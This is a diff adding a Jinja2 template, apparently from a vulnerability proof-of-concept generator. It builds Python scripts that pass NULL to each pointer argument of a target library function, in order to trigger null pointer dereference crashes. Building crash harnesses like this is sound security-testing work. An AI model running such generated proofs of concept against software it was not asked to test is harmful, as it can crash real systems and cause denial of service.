@@ -1,0 +1,45 @@
+{% extends "poc/base.py.j2" %}
+
+{% block description %}Null pointer dereference{% endblock %}
+
+{% block payload %}
+# NULL pointer to trigger crash
+payload = None
+{% endblock %}
+
+{% block exploit_doc %}Trigger null pointer dereference{% endblock %}
+
+{% block exploit_body %}
+        print(f"[*] Sink API: {{ sink_api }}")
+{% if arg_count and arg_count > 1 %}
+        print(f"[*] Function takes {{ arg_count }} arguments")
+{% endif %}
+
+        # 找出指针参数位置
+        ptr_arg_indices = []
+        for i, info in enumerate(ARGS_INFO):
+            is_ptr = info.get('is_pointer', False) or '*' in info.get('type', '')
+            if is_ptr:
+                ptr_arg_indices.append(i)
+        if not ptr_arg_indices:
+            ptr_arg_indices = [0]  # 默认测试第一个参数
+
+        for arg_idx in ptr_arg_indices:
+            print(f"\n[*] Testing NULL at argument {arg_idx}...")
+            try:
+                # 构建参数，目标位置传 NULL
+                args = []
+                for i in range(ARG_COUNT):
+                    if i == arg_idx:
+                        args.append(None)  # NULL
+                    else:
+                        args.append(arg_builder.get_buffer_ptr(i))
+                result = func(*args)
+                print(f"    -> Returned: {result} (no crash)")
+            except OSError as e:
+                print(f"    -> Windows Error: {e}")
+            except Exception as e:
+                print(f"    -> Exception: {type(e).__name__}: {e}")
+
+        print("\n[+] All positions tested")
+{% endblock %}
